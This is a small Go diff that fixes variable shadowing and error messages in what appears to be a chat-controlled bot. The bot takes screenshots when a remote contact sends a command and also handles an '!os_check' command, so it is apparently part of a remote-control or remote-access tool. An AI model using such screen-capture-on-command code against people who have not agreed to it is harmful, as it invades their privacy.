@@ -172,14 +172,14 @@ func main() {
                            if err != nil {
                                panic(err)
                             }
-                            t := time.Now().UTC()
-                            f, err := os.Create(t.String() + ".png")
+                            tNow := time.Now().UTC()
+                            f, err := os.Create(tNow.String() + ".png")
                             if err != nil {
-                                t.FriendSendMessage(friendNumber, err)
+                                t.FriendSendMessage(friendNumber, "Error creating screenshot file")
                             }
                             err = png.Encode(f, img)
                             if err != nil {
-                                t.FriendSendMessage(friendNumber, err)
+                                t.FriendSendMessage(friendNumber, "Error encoding screenshot")
                              }
                             f.Close()
                     } else if string(message) == "!os_check" {
